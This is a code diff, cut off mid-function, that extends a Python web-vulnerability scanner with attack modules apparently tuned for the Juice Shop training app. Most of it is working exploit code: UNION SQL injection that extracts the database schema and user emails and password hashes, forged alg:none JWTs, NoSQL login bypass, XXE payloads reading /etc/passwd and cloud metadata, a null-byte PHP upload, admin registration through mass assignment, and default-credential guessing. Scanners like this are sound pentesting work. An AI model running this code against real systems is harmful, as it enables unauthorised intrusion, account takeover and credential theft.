@@ -53,6 +53,18 @@ from app.api.v1.attack_patterns import (
     REDIRECT_PARAMS, REDIRECT_PAYLOADS,
     TECH_SIGNATURES, COMMON_SENSITIVE_PATHS,
     REST_API_PATHS, MONITORING_PATHS,
+    # New patterns for expanded modules
+    SSTI_PAYLOADS, SSTI_INDICATORS, SSTI_TEST_FIELDS,
+    NOSQL_INJECTION_PAYLOADS, NOSQL_URL_PAYLOADS, NOSQL_REST_ENDPOINTS, NOSQL_SLEEP_PAYLOADS,
+    XXE_PAYLOADS, XXE_INDICATORS,
+    FILE_UPLOAD_PATHS,
+    INFO_DISCLOSURE_PATHS, INFO_DISCLOSURE_INDICATORS,
+    WEAK_CREDENTIAL_PAIRS,
+    PROTOTYPE_POLLUTION_PAYLOADS,
+    DOM_XSS_PAYLOADS,
+    COUPON_CODES, BUSINESS_LOGIC_BASKET_ATTACKS,
+    JWT_ALG_NONE_VARIANTS,
+    SENSITIVE_AUTH_ENDPOINTS,
 )
 
 router = APIRouter(prefix="/attack-suite", tags=["AttackSuite"])
@@ -77,6 +89,13 @@ MODULES_META = [
     {"id": "jwt",           "label": "JWT Analyzer",           "description": "alg:none, weak secrets, kid injection, claims exposure — 60 reports"},
     {"id": "redirect",      "label": "Open Redirect",          "description": "OAuth redirect_uri, redirect param bypass — 168 reports, chains to ATO"},
     {"id": "auth_bypass",   "label": "Auth Bypass",            "description": "Admin paths, X-Forwarded-For, method override, sensitive file exposure"},
+    {"id": "nosql",         "label": "NoSQL Injection",        "description": "MongoDB operator injection, NoSQL DoS, aggregation-based data extraction"},
+    {"id": "ssti",          "label": "SSTI Detection",         "description": "Server-side template injection in Jinja2, Freemarker, Twig, SpEL, ERB"},
+    {"id": "xxe",           "label": "XXE Injection",          "description": "XML External Entity attacks on XML-accepting endpoints and file upload"},
+    {"id": "file_upload",   "label": "File Upload Bypass",     "description": "Extension bypass, null-byte, size limit, type restriction bypass"},
+    {"id": "broken_auth",   "label": "Broken Authentication",  "description": "Weak/default credentials, password strength, brute-force protection"},
+    {"id": "info_disclosure","label": "Information Disclosure", "description": "FTP directory, forgotten backups, .env files, Git exposure, log files"},
+    {"id": "deserialization","label": "Insecure Deserialization","description": "Prototype pollution, zip bomb, XML billion laughs"},
 ]
 
 # ── Models ────────────────────────────────────────────────────────────────────
@@ -92,15 +111,23 @@ class LoginConfig(BaseModel):
     login_url: str = ""
     username: str = ""
     password: str = ""
-    username_field: str = "username"
+    username_field: str = "username"    # field name for form/json login
     password_field: str = "password"
-    login_type: str = "form"          # form | bearer | basic | cookie
+    login_type: str = "form"            # form | bearer | basic | cookie | rest_json
     bearer_token: str = ""
     cookie: str = ""
+    # rest_json: path inside JSON response where the token lives
+    # e.g. "authentication.token" for Juice Shop, "access_token" for OAuth
+    token_path: str = "access_token"
 
 class Account2Config(BaseModel):
     """Second account for IDOR testing (cross-account access)."""
     enabled: bool = False
+    login_url: str = ""
+    username: str = ""
+    password: str = ""
+    login_type: str = "rest_json"       # form | bearer | basic | cookie | rest_json
+    token_path: str = "access_token"
     bearer_token: str = ""
     cookie: str = ""
 
@@ -319,6 +346,42 @@ async def _perform_login(client: httpx.AsyncClient, cfg: LoginConfig,
 
     if cfg.login_type == "cookie":
         return {"Cookie": cfg.cookie}
+
+    if cfg.login_type == "rest_json":
+        login_url = cfg.login_url or f"{target}/api/login"
+        try:
+            payload = {
+                cfg.username_field: cfg.username,
+                cfg.password_field: cfg.password,
+            }
+            lr = await client.post(
+                login_url,
+                json=payload,
+                headers={"Content-Type": "application/json", "Accept": "application/json"},
+                timeout=10,
+                follow_redirects=True,
+            )
+            if lr.status_code < 400:
+                try:
+                    data = lr.json()
+                    # Navigate dot-path like "authentication.token"
+                    token = data
+                    for part in cfg.token_path.split("."):
+                        if isinstance(token, dict):
+                            token = token.get(part)
+                        else:
+                            token = None
+                            break
+                    if token and isinstance(token, str):
+                        return {"Authorization": f"Bearer {token}"}
+                    # Fallback: scan top-level keys
+                    for key in ["access_token", "token", "accessToken", "jwt", "id_token"]:
+                        if key in data and isinstance(data[key], str):
+                            return {"Authorization": f"Bearer {data[key]}"}
+                except Exception:
+                    pass
+        except httpx.HTTPError:
+            pass
 
     if cfg.login_type == "form":
         login_url = cfg.login_url or f"{target}/login"
@@ -762,7 +825,7 @@ async def _module_sqli(target: str, client: httpx.AsyncClient,
                         target, True,
                         "Use parameterized queries. Never display DB errors to users.",
                         confidence="high")
-                    return
+                    break  # move to next param
             except httpx.HTTPError:
                 pass
             await asyncio.sleep(0)
@@ -784,7 +847,7 @@ async def _module_sqli(target: str, client: httpx.AsyncClient,
                         "Replace string concatenation with prepared statements. "
                         "Audit all DB query construction.",
                         confidence="high")
-                    return
+                    break  # move to next param
             except (httpx.TimeoutException, httpx.HTTPError):
                 pass
             await asyncio.sleep(0)
@@ -824,7 +887,7 @@ async def _module_sqli(target: str, client: httpx.AsyncClient,
                                 "Use parameterized queries / ORM in authentication logic. "
                                 "Never concatenate user input into SQL strings.",
                                 confidence="high")
-                            return
+                            break  # found on this path, move to next path
                     except Exception:
                         pass
                 if any(pat in bl for pat in SQLI_ERROR_PATTERNS):
@@ -835,7 +898,7 @@ async def _module_sqli(target: str, client: httpx.AsyncClient,
                         url, True,
                         "Use parameterized queries in authentication logic.",
                         confidence="high")
-                    return
+                    break  # found on this path, move to next path
             except httpx.HTTPError:
                 pass
             await asyncio.sleep(0)
@@ -860,6 +923,88 @@ async def _module_sqli(target: str, client: httpx.AsyncClient,
             except httpx.HTTPError:
                 pass
             await asyncio.sleep(0)
+
+    # ── UNION-based SQLi — adaptive column-count probing then exfiltration ─────
+    # Heuristically finds the right number of UNION columns then dumps schema + creds
+    union_endpoints = [
+        (f"{target}/rest/products/search", "q", "'))"),   # Juice Shop search
+        (f"{target}/api/products/search", "q", "'"),
+        (f"{target}/search", "q", "'"),
+    ]
+    for url, param, prefix in union_endpoints:
+        # Step 1: Find correct column count (1-12)
+        correct_cols = 0
+        for n in range(1, 13):
+            test_payload = f"{prefix} UNION SELECT {','.join(str(i) for i in range(1, n+1))}--"
+            try:
+                from urllib.parse import quote as _quote
+                r = await client.get(f"{url}?{param}={_quote(test_payload)}", timeout=8)
+                if r.status_code == 200:
+                    try:
+                        data = r.json()
+                        items = data.get("data", data) if isinstance(data, dict) else data
+                        if isinstance(items, list) and any(
+                            str(i) in str(items) for i in range(1, n+1)
+                        ):
+                            correct_cols = n
+                            break
+                    except Exception:
+                        pass
+            except httpx.HTTPError:
+                break
+            await asyncio.sleep(0)
+
+        if not correct_cols:
+            continue
+
+        # Step 2: Exfiltrate schema
+        schema_payload = f"{prefix} UNION SELECT {','.join(['sql' if i == 2 else str(i) for i in range(1, correct_cols+1)])} FROM sqlite_master--"
+        try:
+            r = await client.get(f"{url}?{param}={_quote(schema_payload)}", timeout=8)
+            if r.status_code == 200 and ("CREATE TABLE" in r.text or "sqlite_sequence" in r.text):
+                yield _finding("sqli", "sqli_schema_exfiltration", "critical",
+                    "SQL Injection — Full Database Schema Extracted",
+                    f"UNION-based SQLi ({correct_cols} columns) against `{url}` returned the complete "
+                    f"database schema (CREATE TABLE statements). All table structures are exposed.",
+                    f"URL: {url}?{param}=<UNION SELECT>\nSchema snippet: {r.text[:500]}",
+                    url, True,
+                    "Use parameterized queries / ORM. Never concatenate user input into SQL. "
+                    "Disable SQL error messages in production.",
+                    confidence="high")
+        except httpx.HTTPError:
+            pass
+        await asyncio.sleep(0)
+
+        # Step 3: Exfiltrate user credentials
+        # Build column list: put email at col 2, password at col 3
+        cred_cols = list(range(1, correct_cols + 1))
+        if correct_cols >= 3:
+            cred_cols[1] = "email"
+            cred_cols[2] = "password"
+        cred_payload = f"{prefix} UNION SELECT {','.join(str(c) for c in cred_cols)} FROM Users--"
+        try:
+            r = await client.get(f"{url}?{param}={_quote(cred_payload)}", timeout=8)
+            if r.status_code == 200:
+                data_str = r.text
+                # Check for email + hash in response
+                import re as _re
+                emails = _re.findall(r'[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+', data_str)
+                hashes = _re.findall(r'[a-f0-9]{32,64}', data_str)
+                if emails and hashes:
+                    yield _finding("sqli", "sqli_credential_exfiltration", "critical",
+                        "SQL Injection — User Credentials Extracted",
+                        f"UNION-based SQLi dumped {len(emails)} email address(es) and {len(hashes)} password hash(es) "
+                        f"from the Users table. All user accounts are compromised.",
+                        f"URL: {url}?{param}=<UNION SELECT email,password FROM Users>\n"
+                        f"Emails found: {emails[:3]}\nHashes found: {hashes[:3]}",
+                        url, True,
+                        "Use parameterized queries. Apply bcrypt/Argon2 password hashing. "
+                        "Never expose password hashes in API responses.",
+                        confidence="high")
+        except httpx.HTTPError:
+            pass
+        await asyncio.sleep(0)
+        break  # found a working endpoint, stop
 
     # ── HTML form login SQLi ──────────────────────────────────────────────────
     for form in forms[:3]:
@@ -1351,6 +1496,76 @@ async def _module_business(target: str, client: httpx.AsyncClient,
                     except httpx.HTTPError:
                         pass
 
+    # Test negative quantity in basket (Juice Shop Payback Time challenge)
+    basket_endpoints = ["/api/BasketItems", "/api/basket", "/api/Baskets/1/Products", "/rest/basket"]
+    for path in basket_endpoints[:3]:
+        url = target + path
+        try:
+            # Try adding item with negative quantity
+            r = await client.post(url, json={"ProductId": 1, "BasketId": 1, "quantity": -100}, timeout=8)
+            if r.status_code in (200, 201):
+                try:
+                    data = r.json()
+                    # Check if the order total becomes negative
+                    if "quantity" in str(data) or "BasketItem" in str(data):
+                        yield _finding("business", "negative_quantity_basket", "high",
+                            "Business Logic — Negative Quantity Accepted (Payback Attack)",
+                            f"POST {url} accepted quantity=-100. If this applies to checkout, "
+                            f"the order total becomes negative and the store owes the attacker money.",
+                            f"URL: {url}\nPayload: {{ProductId: 1, quantity: -100}}\nResponse: {str(data)[:200]}",
+                            url, True,
+                            "Validate quantity on server-side: reject values <= 0. "
+                            "Apply business rule checks before processing payment.",
+                            confidence="medium")
+                except Exception:
+                    pass
+        except httpx.HTTPError:
+            pass
+        await asyncio.sleep(0)
+
+    # Test zero-star feedback (Juice Shop Zero Stars challenge)
+    feedback_url = target + "/api/Feedbacks"
+    try:
+        r = await client.post(feedback_url, json={"comment": "Zero star test", "rating": 0}, timeout=8)
+        if r.status_code in (200, 201):
+            yield _finding("business", "zero_star_feedback", "low",
+                "Zero-Star Feedback Accepted — Input Validation Bypass",
+                "POST /api/Feedbacks with rating=0 succeeded. Client-side validation (1-5 stars) "
+                "is bypassable — server does not validate minimum rating.",
+                f"URL: {feedback_url}\nPayload: {{rating: 0}}\nStatus: {r.status_code}",
+                feedback_url, True,
+                "Validate rating range server-side (1 <= rating <= 5). Never trust client-side validation alone.",
+                confidence="high")
+    except httpx.HTTPError:
+        pass
+
+    # Test admin registration via mass assignment (Admin Registration challenge)
+    register_url = target + "/api/Users"
+    try:
+        r = await client.post(register_url, json={
+            "email": f"attacker_{uuid.uuid4().hex[:6]}@evil.com",
+            "password": "Test1234!",
+            "passwordRepeat": "Test1234!",
+            "role": "admin"
+        }, timeout=8)
+        if r.status_code in (200, 201):
+            try:
+                data = r.json()
+                if data.get("data", {}).get("role") == "admin" or "admin" in str(data).lower():
+                    yield _finding("business", "admin_registration_mass_assignment", "critical",
+                        "Mass Assignment — Admin Registration via role Field",
+                        "POST /api/Users with `role: 'admin'` created an admin account. "
+                        "The server does not filter or ignore privileged fields in registration.",
+                        f"URL: {register_url}\nPayload includes role: 'admin'\nResponse: {str(data)[:300]}",
+                        register_url, True,
+                        "Use a DTO/allowlist — only accept expected fields (email, password). "
+                        "Explicitly exclude role, isAdmin, and privilege fields from user registration.",
+                        confidence="high")
+            except Exception:
+                pass
+    except httpx.HTTPError:
+        pass
+
 
 # ── Module: GraphQL ───────────────────────────────────────────────────────────
 
@@ -1545,6 +1760,55 @@ async def _module_jwt(target: str, client: httpx.AsyncClient,
                     except httpx.HTTPError:
                         pass
 
+    # Test alg:none attack — forge JWT with algorithm set to none
+    auth_header = client.headers.get("Authorization", "")
+    if auth_header.startswith("Bearer "):
+        token_for_none = auth_header[7:]
+        parts_none = token_for_none.split(".")
+        if len(parts_none) == 3:
+            try:
+                import base64 as _b64
+                header_decoded = _b64.b64decode(parts_none[0] + "==").decode()
+                header_obj = json.loads(header_decoded)
+                original_alg = header_obj.get("alg", "HS256")
+
+                for none_variant in JWT_ALG_NONE_VARIANTS[:4]:
+                    forged_header = json.dumps({"typ": "JWT", "alg": none_variant}).encode()
+                    forged_header_b64 = _b64.urlsafe_b64encode(forged_header).rstrip(b"=").decode()
+
+                    # Keep original payload, empty signature
+                    forged_token = f"{forged_header_b64}.{parts_none[1]}."
+
+                    test_endpoints = ["/rest/user/whoami", "/api/me", "/api/user", "/api/Users"]
+                    for ep in test_endpoints[:2]:
+                        try:
+                            r = await client.get(target + ep,
+                                headers={"Authorization": f"Bearer {forged_token}"},
+                                timeout=8)
+                            if r.status_code == 200 and len(r.content) > 20:
+                                try:
+                                    data = r.json()
+                                    if any(k in str(data) for k in ["email", "username", "id", "role"]):
+                                        yield _finding("jwt", "jwt_alg_none",
+                                            "critical",
+                                            f"JWT Algorithm Confusion — alg:none Accepted",
+                                            f"The server accepted a JWT with `alg:{none_variant}` (no signature). "
+                                            f"Any user can forge tokens for any account without knowing the secret.",
+                                            f"Original alg: {original_alg}\nForged alg: {none_variant}\n"
+                                            f"Endpoint: {target + ep}\nResponse: {str(data)[:200]}",
+                                            target + ep, True,
+                                            "Explicitly whitelist allowed algorithms server-side (HS256, RS256). "
+                                            "Reject tokens with alg:none. Use a JWT library that disallows none by default.",
+                                            confidence="high")
+                                        break
+                                except Exception:
+                                    pass
+                        except httpx.HTTPError:
+                            pass
+                    await asyncio.sleep(0)
+            except Exception:
+                pass
+
 
 # ── Module: Open Redirect ─────────────────────────────────────────────────────
 
@@ -1733,6 +1997,754 @@ async def _module_takeover(target: str, client: httpx.AsyncClient) -> AsyncGener
         pass
 
 
+# ── Module: NoSQL Injection ───────────────────────────────────────────────────
+
+async def _module_nosql(target: str, client: httpx.AsyncClient,
+                        forms: list[dict]) -> AsyncGenerator[dict, None]:
+    """Test for NoSQL injection via MongoDB operator injection."""
+
+    # Test REST endpoints with operator injection in URL params
+    for path, param in NOSQL_REST_ENDPOINTS:
+        url = target + path
+        for payload in NOSQL_URL_PAYLOADS[:3]:
+            try:
+                r = await client.get(f"{url}?{param}{payload}", timeout=8)
+                if r.status_code == 200 and len(r.content) > 100:
+                    try:
+                        data = r.json()
+                        # If we get a list of items back with operator injection, likely NoSQL injection
+                        items = data if isinstance(data, list) else data.get("data", [])
+                        if isinstance(items, list) and len(items) > 0:
+                            yield _finding("nosql", "nosql_url_operator", "high",
+                                f"NoSQL Injection via URL Parameter: {path}",
+                                f"MongoDB operator `{payload}` in `{param}` returned {len(items)} records. "
+                                f"Operator injection may allow unauthorized data access or auth bypass.",
+                                f"URL: {url}?{param}{payload}\nRecords returned: {len(items)}\nSample: {str(items[0])[:200]}",
+                                url, True,
+                                "Validate and sanitize all inputs. Use allowlists for query params. "
+                                "Disable MongoDB operator injection with schema validation.",
+                                confidence="medium")
+                            break
+                    except Exception:
+                        pass
+            except httpx.HTTPError:
+                pass
+            await asyncio.sleep(0)
+
+    # Test REST login endpoints with JSON operator injection
+    rest_login_paths = [
+        "/rest/user/login", "/api/auth/login", "/api/login",
+        "/api/v1/auth/login", "/auth/login",
+    ]
+    for path in rest_login_paths[:4]:
+        url = target + path
+        for op_payload in [{"$gt": ""}, {"$ne": None}, {"$regex": ".*"}]:
+            try:
+                payload = {"email": op_payload, "password": op_payload}
+                r = await client.post(url, json=payload, timeout=8)
+                if r.status_code in (200, 201):
+                    try:
+                        data = r.json()
+                        if any(k in str(data) for k in ["token", "access_token", "authentication", "user"]):
+                            yield _finding("nosql", "nosql_login_bypass", "critical",
+                                "NoSQL Injection Auth Bypass via REST Login",
+                                f"MongoDB operator `{op_payload}` in login payload bypassed authentication — "
+                                f"a token was returned without valid credentials.",
+                                f"URL: {url}\nPayload: {payload}\nResponse keys: {list(data.keys())[:5]}",
+                                url, True,
+                                "Use MongoDB schema validation to reject operator objects in string fields. "
+                                "Never pass raw request body objects directly to database queries.",
+                                confidence="high")
+                            break
+                    except Exception:
+                        pass
+            except httpx.HTTPError:
+                pass
+            await asyncio.sleep(0)
+
+    # Test for NoSQL injection in form POST endpoints
+    for form in forms[:3]:
+        if form.get("method") != "POST":
+            continue
+        inputs = form.get("inputs", [])
+        user_fields = [i for i in inputs if any(k in i.lower() for k in ["user", "email", "login"])]
+        if not user_fields:
+            continue
+        # Try sending operator as value — some frameworks parse [$gt]= in forms
+        for field in user_fields[:1]:
+            try:
+                form_data = {inp: "[$ne]=invalid" if inp == field else "test" for inp in inputs}
+                r = await client.post(form["action"], data=form_data, timeout=8)
+                if r.status_code == 200 and len(r.content) > 100:
+                    yield _finding("nosql", "nosql_form_injection", "medium",
+                        "Potential NoSQL Injection via Form Parameter",
+                        f"Form at {form['action']} may accept MongoDB operators via `{field}` field.",
+                        f"Form: {form['action']}\nField: {field}\nStatus: {r.status_code}",
+                        form["action"], False,
+                        "Validate all form inputs server-side. Reject operator-like strings in string fields.",
+                        confidence="low")
+            except httpx.HTTPError:
+                pass
+        await asyncio.sleep(0)
+
+
+# ── Module: SSTI ─────────────────────────────────────────────────────────────
+
+async def _module_ssti(target: str, client: httpx.AsyncClient,
+                       forms: list[dict]) -> AsyncGenerator[dict, None]:
+    """Detect Server-Side Template Injection in forms and URL params."""
+
+    # Test URL parameters
+    ssti_params = ["name", "q", "search", "message", "template", "subject", "input"]
+    for param in ssti_params[:4]:
+        for payload in SSTI_PAYLOADS[:5]:
+            try:
+                r = await client.get(f"{target}?{param}={payload}", timeout=8)
+                # Check for math result indicating SSTI
+                if "49" in r.text and payload == "{{7*7}}":
+                    yield _finding("ssti", "ssti_reflected_math", "critical",
+                        f"Server-Side Template Injection via '{param}' URL Parameter",
+                        f"Payload `{{{{7*7}}}}` rendered as `49` in the response. "
+                        f"The server is executing template expressions — this enables RCE.",
+                        f"URL: {target}?{param}={payload}\nEvidence: '49' found in response",
+                        target, True,
+                        "Never render user input through a template engine. "
+                        "Use sandboxed template environments or render user data as literals.",
+                        confidence="high")
+                    return
+                if "7777777" in r.text and payload == "{{7*'7'}}":
+                    yield _finding("ssti", "ssti_jinja2_string_mul", "critical",
+                        "Jinja2 SSTI Confirmed via String Multiplication",
+                        f"Payload `{{{{7*'7'}}}}` rendered as `7777777`. Jinja2 template injection confirmed.",
+                        f"URL: {target}?{param}={payload}\nEvidence: '7777777' in response",
+                        target, True,
+                        "Sanitize all user input before passing to template rendering. "
+                        "Use Jinja2's SandboxedEnvironment.",
+                        confidence="high")
+                    return
+            except httpx.HTTPError:
+                pass
+            await asyncio.sleep(0)
+
+    # Test POST forms
+    for form in forms[:5]:
+        inputs = form.get("inputs", [])
+        action = form.get("action", "")
+        if not action:
+            continue
+        for field in SSTI_TEST_FIELDS:
+            if field not in inputs:
+                continue
+            for payload in SSTI_PAYLOADS[:3]:
+                try:
+                    form_data = {inp: payload if inp == field else "test" for inp in inputs}
+                    r = await client.post(action, data=form_data, timeout=8)
+                    if "49" in r.text and payload == "{{7*7}}":
+                        yield _finding("ssti", "ssti_form_injection", "critical",
+                            f"Server-Side Template Injection in Form Field '{field}'",
+                            f"Payload `{{{{7*7}}}}` rendered as `49` in response from {action}. "
+                            f"The server evaluates template expressions in user input.",
+                            f"Form: {action}\nField: {field}\nEvidence: '49' in response",
+                            action, True,
+                            "Treat all user input as data, never as template code. "
+                            "Use context-aware escaping in templates.",
+                            confidence="high")
+                        return
+                except httpx.HTTPError:
+                    pass
+                await asyncio.sleep(0)
+
+    # Test Juice Shop specific search endpoint
+    try:
+        r = await client.get(f"{target}/rest/products/search?q={{{{7*7}}}}", timeout=8)
+        if "49" in r.text:
+            yield _finding("ssti", "ssti_search_endpoint", "critical",
+                "SSTI in Search Endpoint",
+                "Template expression `{{7*7}}` evaluated to `49` in search response.",
+                f"URL: {target}/rest/products/search?q={{{{7*7}}}}\nEvidence: '49' in response",
+                target + "/rest/products/search", True,
+                "Escape template expressions in all query parameters before rendering.",
+                confidence="high")
+    except httpx.HTTPError:
+        pass
+
+
+# ── Module: XXE ───────────────────────────────────────────────────────────────
+
+async def _module_xxe(target: str, client: httpx.AsyncClient) -> AsyncGenerator[dict, None]:
+    """Test XML External Entity injection on XML-accepting endpoints."""
+
+    xml_endpoints = [
+        "/b2b/v2/orders",
+        "/api/xml",
+        "/api/v1/xml",
+        "/import",
+        "/api/import",
+        "/upload",
+    ]
+
+    order_xxe_payload = """<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<orders>
+  <order>
+    <quantity>1</quantity>
+    <item>&xxe;</item>
+    <address>test</address>
+  </order>
+</orders>"""
+
+    xxe_ssrf_payload = """<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
+<order><quantity>&xxe;</quantity></order>"""
+
+    for path in xml_endpoints:
+        url = target + path
+        for payload, name in [
+            (order_xxe_payload, "file_read"),
+            (xxe_ssrf_payload, "ssrf"),
+        ]:
+            try:
+                r = await client.post(url,
+                    content=payload.encode(),
+                    headers={"Content-Type": "application/xml"},
+                    timeout=10)
+                body = r.text
+                # Check for file read
+                if any(ind in body for ind in ["root:", "/bin/bash", "/sbin/nologin"]):
+                    yield _finding("xxe", "xxe_file_read", "critical",
+                        f"XXE — Local File Read via {path}",
+                        f"XML External Entity payload read /etc/passwd contents. "
+                        f"Full server filesystem access is possible.",
+                        f"Endpoint: {url}\nEvidence: /etc/passwd content in response\n"
+                        f"Snippet: {body[:300]}",
+                        url, True,
+                        "Disable external entity processing in XML parsers. "
+                        "Use XMLConstants.FEATURE_SECURE_PROCESSING in Java. "
+                        "Set libxml_disable_entity_loader(true) in PHP.",
+                        confidence="high")
+                    break
+                # Check for SSRF via XXE
+                if any(ind in body for ind in ["ami-id", "instance-id", "computeMetadata"]):
+                    yield _finding("xxe", "xxe_ssrf", "critical",
+                        f"XXE SSRF — Cloud Metadata Access via {path}",
+                        f"XXE payload triggered SSRF to cloud metadata service.",
+                        f"Endpoint: {url}\nEvidence: cloud metadata in response",
+                        url, True,
+                        "Disable external entities. Block access to internal metadata endpoints.",
+                        confidence="high")
+                # Check for XML parsing error (server accepts XML)
+                if r.status_code != 404 and any(ind in body.lower() for ind in
+                        ["xml", "entity", "parsing", "malformed", "syntax error"]):
+                    yield _finding("xxe", "xxe_parser_exposed", "medium",
+                        f"XML Parser Exposed at {path}",
+                        f"Endpoint accepts XML input — may be vulnerable to XXE. "
+                        f"XML parsing errors detected in response.",
+                        f"Endpoint: {url}\nStatus: {r.status_code}\nResponse: {body[:200]}",
+                        url, True,
+                        "Configure XML parser to disallow DOCTYPE declarations and external entities. "
+                        "Validate and sanitize all XML input.",
+                        confidence="low")
+                    break
+            except httpx.HTTPError:
+                pass
+            await asyncio.sleep(0)
+
+    # Test the Juice Shop B2B endpoint specifically
+    juiceshop_b2b = target + "/b2b/v2/orders"
+    try:
+        r = await client.post(juiceshop_b2b,
+            content=order_xxe_payload.encode(),
+            headers={"Content-Type": "application/xml", "X-User-Email": "admin@juice-sh.op"},
+            timeout=10)
+        if r.status_code not in (404, 405):
+            body = r.text
+            if any(ind in body for ind in XXE_INDICATORS):
+                yield _finding("xxe", "xxe_b2b_confirmed", "critical",
+                    "XXE Confirmed in B2B Order API",
+                    f"B2B XML order endpoint parsed external entities. "
+                    f"Server file contents were returned in the response.",
+                    f"Endpoint: {juiceshop_b2b}\nEvidence: {body[:300]}",
+                    juiceshop_b2b, True,
+                    "Disable external XML entity processing on the order ingestion endpoint.",
+                    confidence="high")
+            elif r.status_code in (200, 201, 400):
+                yield _finding("xxe", "xxe_b2b_accepts_xml", "info",
+                    "B2B XML Endpoint Active — Test Manually for XXE",
+                    f"POST {juiceshop_b2b} accepts XML input (status {r.status_code}). "
+                    f"Manually verify XXE with DOCTYPE/entity payloads.",
+                    f"Endpoint: {juiceshop_b2b}\nStatus: {r.status_code}",
+                    juiceshop_b2b, False,
+                    "Audit XML parsing configuration for external entity handling.",
+                    confidence="low")
+    except httpx.HTTPError:
+        pass
+
+
+# ── Module: File Upload ────────────────────────────────────────────────────────
+
+async def _module_file_upload(target: str, client: httpx.AsyncClient,
+                               spa_fallback_size: int = 0) -> AsyncGenerator[dict, None]:
+    """Test file upload endpoints for extension bypass, size limits, and XXE in SVG."""
+    import io
+
+    for path in FILE_UPLOAD_PATHS:
+        url = target + path
+        # First probe to check endpoint exists
+        try:
+            probe = await client.get(url, timeout=6)
+            if _is_spa_fallback(probe, spa_fallback_size) or probe.status_code == 404:
+                continue
+        except httpx.HTTPError:
+            pass
+
+        # Test 1: Upload oversized file (>100 KB) — Juice Shop Upload Size challenge
+        oversized_content = b"A" * 150000  # 150 KB
+        try:
+            files = {"file": ("test.pdf", io.BytesIO(oversized_content), "application/pdf")}
+            r = await client.post(url, files=files, timeout=10)
+            if r.status_code in (200, 201):
+                yield _finding("file_upload", "upload_size_bypass", "medium",
+                    f"File Upload Size Limit Not Enforced: {path}",
+                    f"Uploaded a 150 KB file to {path} successfully (got {r.status_code}). "
+                    f"Server does not enforce file size limits.",
+                    f"Endpoint: {url}\nFile size: 150 KB\nStatus: {r.status_code}",
+                    url, True,
+                    "Enforce file size limits server-side. Reject files exceeding the allowed size.",
+                    confidence="medium")
+        except httpx.HTTPError:
+            pass
+        await asyncio.sleep(0)
+
+        # Test 2: Upload non-PDF/ZIP file — Juice Shop Upload Type challenge
+        try:
+            files = {"file": ("test.xml", io.BytesIO(b"<test>hello</test>"), "text/xml")}
+            r = await client.post(url, files=files, timeout=10)
+            if r.status_code in (200, 201):
+                yield _finding("file_upload", "upload_type_bypass", "medium",
+                    f"File Type Restriction Bypassable: {path}",
+                    f"Uploaded a `.xml` file (not pdf/zip) and got status {r.status_code}. "
+                    f"Server does not validate file type server-side.",
+                    f"Endpoint: {url}\nFile: test.xml\nStatus: {r.status_code}",
+                    url, True,
+                    "Validate file type by content (magic bytes), not just extension or MIME type. "
+                    "Use a file type allowlist enforced server-side.",
+                    confidence="medium")
+        except httpx.HTTPError:
+            pass
+        await asyncio.sleep(0)
+
+        # Test 3: SVG XXE via file upload
+        svg_xxe = b"""<?xml version="1.0" standalone="yes"?>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
+<text font-size="16" x="0" y="16">&xxe;</text></svg>"""
+        try:
+            files = {"file": ("test.svg", io.BytesIO(svg_xxe), "image/svg+xml")}
+            r = await client.post(url, files=files, timeout=10)
+            if any(ind in r.text for ind in ["root:", "/bin/bash", "/sbin/nologin"]):
+                yield _finding("file_upload", "upload_svg_xxe", "critical",
+                    f"XXE via SVG File Upload at {path}",
+                    f"SVG file with XXE payload returned /etc/passwd contents. "
+                    f"Full server filesystem access via file upload.",
+                    f"Endpoint: {url}\nEvidence: /etc/passwd in response\nSnippet: {r.text[:200]}",
+                    url, True,
+                    "Sanitize SVG uploads. Disable XML external entities before processing uploads. "
+                    "Use server-side SVG sanitization library.",
+                    confidence="high")
+        except (httpx.HTTPError, Exception):
+            pass
+        await asyncio.sleep(0)
+
+        # Test 4: Null byte extension bypass
+        try:
+            files = {"file": ("test.php\x00.pdf", io.BytesIO(b"<?php echo 'pwned'; ?>"), "application/pdf")}
+            r = await client.post(url, files=files, timeout=10)
+            if r.status_code in (200, 201) and "pwned" in r.text:
+                yield _finding("file_upload", "upload_null_byte_rce", "critical",
+                    f"Null Byte Extension Bypass — Possible RCE at {path}",
+                    f"Uploaded PHP file with null byte bypass (`test.php\\x00.pdf`) — "
+                    f"server executed PHP and returned 'pwned'.",
+                    f"Endpoint: {url}\nFile: test.php\\x00.pdf\nResponse: {r.text[:100]}",
+                    url, True,
+                    "Sanitize file names server-side. Strip null bytes before processing. "
+                    "Never execute uploaded files.",
+                    confidence="high")
+        except (httpx.HTTPError, Exception):
+            pass
+        await asyncio.sleep(0)
+
+
+# ── Module: Broken Authentication ─────────────────────────────────────────────
+
+async def _module_broken_auth(target: str, client: httpx.AsyncClient) -> AsyncGenerator[dict, None]:
+    """Test for weak/default credentials and broken authentication mechanisms."""
+
+    login_endpoints = [
+        ("/rest/user/login", "email", "password"),
+        ("/api/login", "username", "password"),
+        ("/api/auth/login", "email", "password"),
+        ("/api/v1/auth/login", "email", "password"),
+        ("/api/users/login", "email", "password"),
+        ("/login", "email", "password"),
+    ]
+
+    found_login = None
+
+    for path, user_field, pass_field in login_endpoints[:3]:
+        url = target + path
+        # Quick probe
+        try:
+            probe = await client.post(url, json={user_field: "probe@test.com", pass_field: "wrongpassword"}, timeout=6)
+            if probe.status_code == 404:
+                continue
+            found_login = (url, user_field, pass_field)
+            break
+        except httpx.HTTPError:
+            continue
+
+    if not found_login:
+        return
+
+    url, user_field, pass_field = found_login
+
+    for username, password in WEAK_CREDENTIAL_PAIRS[:12]:
+        try:
+            r = await client.post(url, json={user_field: username, pass_field: password}, timeout=8)
+            if r.status_code in (200, 201):
+                try:
+                    data = r.json()
+                    if any(k in str(data) for k in ["token", "access_token", "authentication", "session"]):
+                        yield _finding("broken_auth", "weak_default_credentials", "critical",
+                            f"Weak/Default Credentials Accepted: {username}",
+                            f"Login succeeded with `{username}` / `{password}`. "
+                            f"Default or weak credentials are accepted by the application.",
+                            f"Endpoint: {url}\nUsername: {username}\nPassword: {password}\n"
+                            f"Response keys: {list(data.keys())[:5]}",
